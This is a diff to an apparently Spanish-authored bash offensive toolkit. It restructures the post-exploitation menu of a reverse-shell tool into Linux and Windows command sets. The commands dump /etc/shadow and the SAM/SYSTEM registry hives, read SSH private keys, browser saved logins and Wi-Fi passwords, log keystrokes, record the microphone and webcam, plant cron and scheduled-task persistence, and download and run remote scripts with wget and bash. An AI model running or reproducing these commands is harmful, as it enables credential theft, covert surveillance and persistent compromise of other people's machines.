@@ -1869,6 +1869,7 @@ post_exploitation() {
     tmux new-session -d -s nc_listener "nc -lvnp $listen_port"
 
     echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
+    read -p "Is the shell Linux or Windows? (l/w): " shell_type
     while true; do
         echo -e "1) Gather System Information"
         echo -e "2) Enumerate Users and Groups"
@@ -1891,42 +1892,73 @@ post_exploitation() {
         echo -e "19) Record Microphone"
         echo -e "20) Webcam Capture"
         echo -e "21) Check for Virtual Machines"
-        echo -e "22) Extract SSH Configuration"
+        echo -e "22) Extract (Linux - SSH) / (Windows - RDP) Configuration"
         echo -e "23) Extract Environment Variables"
         echo -e "24) List Open Files"
         echo -e "25) Enumerate Installed Services"
         echo -e "26) Back to Main Menu"
         read -p "Select an option: " post_option
 
-        case $post_option in
-            1) send_command "uname -a && lsb_release -a" 2;;
-            2) send_command "cat /etc/passwd && cat /etc/group" 2;;
-            3) send_command "sudo -l" 2;;
-            3) send_command "find / -type f -name '*password*'" 2;;
-            3) send_command "ifconfig && netstat -an" 2;;
-            3) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" 2;; #Revisar
-            3) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" 2;; #Revisar
-            3) send_command "cat /etc/shadow" 2;;
-            3) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" 2;; #Revisar
-            3) send_command "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" 2;; #Revisar
-            3) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" 2;;
-            3) send_command "dpkg -l || rpm -qa" 2;;
-            3) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" 2;; #Revisar
-            3) send_command "cat ~/.ssh/id_rsa" 2;;
-            3) send_command "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" 2;;
-            3) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" 2;;
-            3) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" 2;;
-            3) send_command "ps aux" 2;;
-            3) send_command "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" 2;;
-            3) send_command "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" 2;;
-            3) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" 2;;
-            3) send_command "cat /etc/ssh/sshd_config" 2;;
-            3) send_command "printenv" 2;;
-            3) send_command "lsof" 2;;
-            3) send_command "systemctl list-units --type=service" 2;;
-
-            26) break ;;
-            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+        if [ "$shell_type" == "l" ]; then
+            case $post_option in
+                1) send_command "uname -a && lsb_release -a" 2;;
+                2) send_command "cat /etc/passwd && cat /etc/group" 2;;
+                3) send_command "sudo -l" 2;;
+                4) send_command "find / -type f -name '*password*'" 2;;
+                5) send_command "ip a && ifconfig && netstat -an" 2;;
+                6) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" 2;; #Cambiar url
+                7) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" 2;; #Cambiar directorio
+                8) send_command "cat /etc/shadow" 2;;
+                9) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" 2;; #Revisar
+                10) send_command "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" 2;; #Cambiar url
+                11) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" 2;;
+                12) send_command "dpkg -l || rpm -qa" 2;;
+                13) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" 2;;
+                14) send_command "cat ~/.ssh/id_rsa" 2;;
+                15) send_command "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" 2;;
+                16) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" 2;;
+                17) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" 2;;
+                18) send_command "ps aux" 2;;
+                19) send_command "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" 2;;
+                20) send_command "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" 2;;
+                21) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" 2;;
+                22) send_command "cat /etc/ssh/sshd_config" 2;;
+                23) send_command "printenv" 2;;
+                24) send_command "lsof" 2;;
+                25) send_command "systemctl list-units --type=service" 2;;
+                26) break ;;
+                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+            esac
+        elif [ "$shell_type" == "w" ]; then
+            case $post_option in
+                1) send_command "systeminfo" 2;;
+                2) send_command "net user && net localgroup" 2;;
+                3) send_command "whoami /priv" 2;;
+                4) send_command "dir /s /b *password*.txt" 2;;
+                5) send_command "ipconfig /all && netstat -an" 2;;
+                6) send_command "powershell -ep bypass -file C:\\path\\to\\privesc_script.ps1" 2;; #Cambiar url
+                7) send_command "schtasks /create /sc onlogon /tn MyTask /tr C:\\path\\to\\payload.exe" 2;; #Cambiar directorio
+                8) send_command "reg save hklm\\sam sam.save && reg save hklm\\system system.save" 2;;
+                9) send_command "powershell -ep bypass -file C:\\path\\to\\keylogger.ps1" 2;; #Revisar
+                10) send_command "powershell -ep bypass -file C:\\path\\to\\exploit_suggester.ps1" 2;; #Cambiar url
+                11) send_command "schtasks /query /fo LIST /v" 2;;
+                12) send_command "wmic product get name,version" 2;;
+                13) send_command "powershell -ep bypass -file C:\\path\\to\\browser_data_collector.ps1" 2;; #Cambiar directorio
+                14) send_command "type C:\\Users\\$USERNAME\\.ssh\\id_rsa" 2;;
+                15) send_command "powershell -ep bypass -file C:\\path\\to\\screenshot.ps1" 2;; #Cambiar directorio
+                16) send_command "powershell -ep bypass -file C:\\path\\to\\network_monitor.ps1" 2;; #Cambiar directorio
+                17) send_command "netsh wlan show profile name=* key=clear" 2;;
+                18) send_command "tasklist" 2;;
+                19) send_command "powershell -ep bypass -file C:\\path\\to\\record_mic.ps1" 2;; #Cambiar directorio
+                20) send_command "powershell -ep bypass -file C:\\path\\to\\webcam_capture.ps1" 2;; #Cambiar directorio
+                21) send_command "wmic computersystem get model" 2;;
+                22) send_command "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" 2;; #Revisar
+                23) send_command "set" 2;;
+                24) send_command "net file" 2;;
+                25) send_command "net start" 2;;
+                26) break ;;
+                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+            esac
         esac
 
         # Display the output from the reverse shell
@@ -1965,8 +1997,8 @@ check_install_dependencies() {
             echo -e "${YELLOW}[-] $dep is not installed. Installing...${NC}"
             if [[ $dep == "theharvester" ]]; then
                 pip install theHarvester
-            elif [[ $dep == "nuclei" || $dep == "finalrecon" ]]; then
-                sudo apt install -y nuclei
+            elif [[ $dep == "nuclei" || $dep == "finalrecon" || $dep == "tmux" ]]; then
+                sudo apt install -y $dep
             else
                 sudo apt-get install -y $dep
             fi
@@ -1999,11 +2031,11 @@ main_menu() {
         echo -e "7) CheatSheets"
         echo -e "8) Hash Crack"
         echo -e "9) Reverse Shell Generator"
-        echo -e "10) Download Tools"
-        echo -e "11) Generate Report"
-        echo -e "12) Check and Install Dependencies"
-        echo -e "13) Save & Exit"
-        echo -e "14) SALVASIO"
+        echo -e "10) Post-Explotation"
+        echo -e "11) Download Tools"
+        echo -e "12) Generate Report"
+        echo -e "13) Check and Install Dependencies"
+        echo -e "14) Save & Exit"
         read -e -p "Option: " main_option
 
         clear
@@ -2037,23 +2069,23 @@ main_menu() {
             9)
                 generate_reverse_shell
                 ;;
-            10)
-                download_tools
+            10) 
+                post_exploitation
                 ;;
             11)
-                save_report
+                download_tools
                 ;;
             12)
-                check_install_dependencies
+                save_report
                 ;;
             13)
+                check_install_dependencies
+                ;;
+            14)
                 save_results
                 echo -e "${GREEN}[+] Exiting the script.${NC}"
                 exit 0
                 ;;
-            14)  # Assuming 15 is the next available option
-            post_exploitation
-            ;;
             *)
                 echo -e "${RED}[-] Invalid option.${NC}"
                 ;;
